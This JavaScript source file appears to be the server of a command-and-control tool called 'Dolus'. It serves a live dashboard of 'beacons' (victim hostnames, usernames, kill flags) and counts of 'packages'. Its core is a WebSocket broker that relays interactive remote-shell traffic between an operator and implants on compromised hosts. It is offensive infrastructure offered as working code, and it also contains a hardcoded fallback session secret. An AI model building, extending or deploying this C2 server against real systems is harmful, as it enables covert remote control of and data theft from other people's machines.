import { createServer } from 'node:http';
import { parse } from 'node:url';
import { createHmac, timingSafeEqual } from 'node:crypto';
import { DatabaseSync } from 'node:sqlite';
import next from 'next';
import { WebSocketServer } from 'ws';

const PORT = parseInt(process.env.PORT || '3000', 10);
const DB_PATH = process.env.DATABASE_PATH || './dolus.db';
const SESSION_COOKIE = 'dolus_session';
const SESSION_MAX_AGE = 86400;

// Separate DB handle for WS auth (Next.js owns the other one)
const db = new DatabaseSync(DB_PATH);

function getBeaconSecret() {
  const row = db.prepare("SELECT value FROM settings WHERE key = 'beacon_secret'").get();
  return row ? row.value : null;
}

function parseCookies(header) {
  const out = {};
  if (!header) return out;
  for (const part of header.split(';')) {
    const eq = part.indexOf('=');
    if (eq < 0) continue;
    out[part.slice(0, eq).trim()] = part.slice(eq + 1).trim();
  }
  return out;
}

function verifySessionToken(token) {
  const idx = token.lastIndexOf('.');
  if (idx < 0) return false;
  const payload = token.slice(0, idx);
  const sigHex = token.slice(idx + 1);
  const dotIdx = payload.indexOf('.');
  if (dotIdx < 0) return false;
  const ts = payload.slice(dotIdx + 1);
  const created = parseInt(ts, 16);
  if (isNaN(created)) return false;
  if (Math.floor(Date.now() / 1000) - created >= SESSION_MAX_AGE) return false;
  const secret = process.env.SESSION_SECRET ?? 'dolus-dev-secret';
  const expected = createHmac('sha256', secret).update(payload).digest('hex');
  if (expected.length !== sigHex.length) return false;
  try {
    return timingSafeEqual(Buffer.from(expected, 'hex'), Buffer.from(sigHex, 'hex'));
  } catch {
    return false;
  }
}

// Live dashboard clients
const dashboardClients = new Set();

function buildBeaconPayload() {
  const now = Math.floor(Date.now() / 1000);
  const beacons = db.prepare('SELECT * FROM beacons ORDER BY last_seen DESC').all();
  const pkgCount = db.prepare('SELECT COUNT(*) as c FROM packages').get().c;
  const alive = beacons.filter(b => b.kill === 0 && b.last_seen > now - 120).length;
  return JSON.stringify({ type: 'beacons', beacons, stats: { total: beacons.length, alive, packages: pkgCount }, now });
}

setInterval(() => {
  if (!dashboardClients.size) return;
  const msg = buildBeaconPayload();
  for (const ws of dashboardClients) {
    if (ws.readyState === 1) ws.send(msg);
    else dashboardClients.delete(ws);
  }
}, 3000);

// In-memory shell broker: beaconUUID → { operator?: WebSocket, implant?: WebSocket, lastSeen?: number }
const shells = new Map();

function getOrCreate(beaconUuid) {
  if (!shells.has(beaconUuid)) shells.set(beaconUuid, {});
  return shells.get(beaconUuid);
}

function onShellConnect(ws, role, beaconUuid) {
  const session = getOrCreate(beaconUuid);

  if (role === 'implant') {
    session.implant = ws;
    // Notify operator that implant is up
    if (session.operator?.readyState === 1) {
      const beacon = db.prepare('SELECT hostname, username FROM beacons WHERE beacon_id = ?').get(beaconUuid);
      session.operator.send(JSON.stringify({
        type: 'connected',
        hostname: beacon?.hostname || beaconUuid,
        username: beacon?.username || '',
      }));
    }
    ws.on('message', (data) => {
      if (session.operator?.readyState === 1) session.operator.send(data);
    });
    ws.on('close', () => {
      session.implant = undefined;
      if (session.operator?.readyState === 1) {
        session.operator.send(JSON.stringify({ type: 'disconnected' }));
      }
      if (!session.operator) shells.delete(beaconUuid);
    });
    ws.on('error', () => {});

  } else {
    // operator
    session.operator = ws;
    // Send waiting status with last_seen so CLI/webshell can compute "Xs ago"
    const beacon = db.prepare('SELECT last_seen FROM beacons WHERE beacon_id = ?').get(beaconUuid);
    ws.send(JSON.stringify({ type: 'waiting', last_seen: beacon?.last_seen || 0 }));

    // If implant already connected, notify immediately
    if (session.implant?.readyState === 1) {
      const b = db.prepare('SELECT hostname, username FROM beacons WHERE beacon_id = ?').get(beaconUuid);
      ws.send(JSON.stringify({ type: 'connected', hostname: b?.hostname || beaconUuid, username: b?.username || '' }));
    }

    // Idle timeout — read per-connection so settings changes apply to new connections
    const idleTimeoutRow = db.prepare("SELECT value FROM settings WHERE key = 'shell_idle_timeout'").get();
    const idleMs = parseInt(idleTimeoutRow?.value || '180', 10) * 1000;
    let lastActivity = Date.now();
    const idleTimer = setInterval(() => {
      if (Date.now() - lastActivity > idleMs) ws.close();
    }, 10_000);

    ws.on('message', (data) => {
      lastActivity = Date.now();
      if (session.implant?.readyState === 1) session.implant.send(data);
    });
    ws.on('close', () => {
      clearInterval(idleTimer);
      session.operator = undefined;
      // Clear shell_requested flag so implant stops trying to reconnect
      db.prepare('UPDATE beacons SET shell_requested = 0 WHERE beacon_id = ?').run(beaconUuid);
      if (session.implant?.readyState === 1) session.implant.close();
      shells.delete(beaconUuid);
    });
    ws.on('error', () => {});
  }
}

// Boot Next.js
const app = next({ dev: false, hostname: '0.0.0.0', port: PORT });
await app.prepare();
const handle = app.getRequestHandler();

const server = createServer((req, res) => handle(req, res, parse(req.url, true)));
const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', (req, socket, head) => {
  const pathname = parse(req.url).pathname;

  // Dashboard live feed — session-authenticated
  if (pathname === '/ws/dashboard') {
    const cookies = parseCookies(req.headers.cookie);
    const token = cookies[SESSION_COOKIE];
    if (!token || !verifySessionToken(token)) return socket.destroy();
    wss.handleUpgrade(req, socket, head, (ws) => {
      dashboardClients.add(ws);
      // Send initial state immediately
      ws.send(buildBeaconPayload());
      ws.on('close', () => dashboardClients.delete(ws));
      ws.on('error', () => dashboardClients.delete(ws));
    });
    return;
  }

  const mOpen    = pathname.match(/^\/ws\/shell\/(.+)\/open$/);
  const mConnect = pathname.match(/^\/ws\/shell\/(.+)\/connect$/);
  if (!mOpen && !mConnect) return socket.destroy();

  const beaconUuid = (mOpen || mConnect)[1];
  const role = mOpen ? 'implant' : 'operator';

  if (role === 'implant') {
    const secret = req.headers['x-beacon-secret'];
    if (!secret || secret !== getBeaconSecret()) return socket.destroy();
  } else {
    const cookies = parseCookies(req.headers.cookie);
    const token = cookies[SESSION_COOKIE];
    if (!token || !verifySessionToken(token)) return socket.destroy();
  }

  wss.handleUpgrade(req, socket, head, (ws) => onShellConnect(ws, role, beaconUuid));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`> Dolus ready on http://0.0.0.0:${PORT}`);
});
